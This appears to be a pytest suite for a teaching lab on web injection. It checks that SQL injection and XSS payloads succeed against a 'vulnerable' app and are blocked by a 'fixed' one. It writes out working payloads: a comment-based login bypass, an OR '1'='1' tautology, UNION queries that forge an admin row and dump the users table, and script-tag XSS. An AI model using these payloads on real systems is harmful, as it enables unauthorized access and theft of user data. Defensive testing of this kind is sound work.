"""A05 Injection: every exploit from SOLUTION.md must work on ``vulnerable``
and must be blocked on ``fixed``, while normal use keeps working on both."""
from conftest import make_client_fixture

LAB = "A05-injection"

vuln = make_client_fixture(LAB, "vulnerable")
fixed = make_client_fixture(LAB, "fixed")

FLAG_LOGIN = "FLAG{a05_sqli_login_bypass}"
FLAG_HIDDEN = "FLAG{a05_hidden_product}"
FLAG_UNION = "FLAG{a05_sqli_union_dump}"

XSS = "<script>alert(1)</script>"

# UNION in the login field forges a whole row (username, role, password) and so
# also defeats a password check done in Python. Only parameterized queries stop it.
FORGED_ADMIN = "x' UNION SELECT 'admin', 'admin', 'pw' --"


def login(client, username, password):
    return client.post("/login", json={"username": username, "password": password})


# --------------------------------------------------------------------------
# vulnerable: the flaws are really there
# --------------------------------------------------------------------------
class TestVulnerable:
    def test_normal_login_works(self, vuln):
        r = login(vuln, "alice", "alice123")
        assert r.status_code == 200
        assert r.get_json()["user"] == "alice"

    def test_wrong_password_rejected(self, vuln):
        assert login(vuln, "alice", "wrong").status_code == 401

    def test_login_bypass_with_comment(self, vuln):
        r = login(vuln, "admin'--", "x")
        assert r.status_code == 200
        assert r.get_json()["flag"] == FLAG_LOGIN

    def test_login_bypass_with_or_true(self, vuln):
        r = login(vuln, "nobody' OR '1'='1' --", "x")
        assert r.status_code == 200

    def test_login_union_forges_admin_row(self, vuln):
        r = login(vuln, FORGED_ADMIN, "pw")
        assert r.status_code == 200
        assert r.get_json()["role"] == "admin"

    def test_hidden_product_leaks(self, vuln):
        r = vuln.get("/products", query_string={"q": "%' OR 1=1 --"})
        assert FLAG_HIDDEN in r.get_data(as_text=True)

    def test_union_dumps_users_table(self, vuln):
        r = vuln.get("/products", query_string={"q": "' UNION SELECT id, username, secret FROM users --"})
        assert FLAG_UNION in r.get_data(as_text=True)

    def test_sql_error_text_is_exposed(self, vuln):
        r = vuln.get("/products", query_string={"q": "'"})
        assert r.status_code == 500
        assert "error" in r.get_json()

    def test_reflected_xss(self, vuln):
        r = vuln.get("/search", query_string={"q": XSS})
        assert XSS in r.get_data(as_text=True)

    def test_stored_xss(self, vuln):
        vuln.post("/guestbook", json={"name": "x", "message": XSS})
        assert XSS in vuln.get("/guestbook").get_data(as_text=True)

    def test_no_csp_header(self, vuln):
        assert "Content-Security-Policy" not in vuln.get("/search?q=a").headers


# --------------------------------------------------------------------------
# fixed: the same attacks no longer work, normal scenarios still do
# --------------------------------------------------------------------------
class TestFixed:
    def test_normal_login_works(self, fixed):
        r = login(fixed, "alice", "alice123")
        assert r.status_code == 200
        assert r.get_json()["user"] == "alice"

    def test_admin_with_real_password_still_gets_flag(self, fixed):
        r = login(fixed, "admin", "Adm1n-lab-pass")
        assert r.status_code == 200
        assert r.get_json()["flag"] == FLAG_LOGIN

    def test_wrong_password_rejected(self, fixed):
        assert login(fixed, "alice", "wrong").status_code == 401

    def test_login_bypass_blocked(self, fixed):
        for payload in ("admin'--", "nobody' OR '1'='1' --"):
            r = login(fixed, payload, "x")
            assert r.status_code == 401, payload
            assert FLAG_LOGIN not in r.get_data(as_text=True)

    def test_login_union_forged_row_blocked(self, fixed):
        r = login(fixed, FORGED_ADMIN, "pw")
        assert r.status_code == 401
        assert FLAG_LOGIN not in r.get_data(as_text=True)

    def test_search_still_works(self, fixed):
        names = [p["name"] for p in fixed.get("/products", query_string={"q": "Лампа"}).get_json()]
        assert names == ["Лампа настольная", "Лампа напольная"]

    def test_hidden_product_not_leaked(self, fixed):
        r = fixed.get("/products", query_string={"q": "%' OR 1=1 --"})
        assert r.status_code == 200
        assert FLAG_HIDDEN not in r.get_data(as_text=True)

    def test_union_returns_nothing(self, fixed):
        r = fixed.get("/products", query_string={"q": "' UNION SELECT id, username, secret FROM users --"})
        assert r.get_json() == []
        assert FLAG_UNION not in r.get_data(as_text=True)

    def test_quote_does_not_cause_sql_error(self, fixed):
        r = fixed.get("/products", query_string={"q": "'"})
        assert r.status_code == 200
        assert r.get_json() == []

    def test_reflected_xss_escaped(self, fixed):
        body = fixed.get("/search", query_string={"q": XSS}).get_data(as_text=True)
        assert XSS not in body
        assert "&lt;script&gt;" in body

    def test_stored_xss_escaped(self, fixed):
        fixed.post("/guestbook", json={"name": "<b>x</b>", "message": XSS})
        body = fixed.get("/guestbook").get_data(as_text=True)
        assert XSS not in body
        assert "&lt;script&gt;" in body

    def test_csp_forbids_scripts_on_content_pages(self, fixed):
        csp = fixed.get("/search?q=a").headers["Content-Security-Policy"]
        assert "default-src 'none'" in csp
        assert "script-src" not in csp

    def test_input_length_is_limited(self, fixed):
        fixed.post("/guestbook", json={"name": "n", "message": "A" * 5000})
        body = fixed.get("/guestbook").get_data(as_text=True)
        assert "A" * 500 in body
        assert "A" * 501 not in body
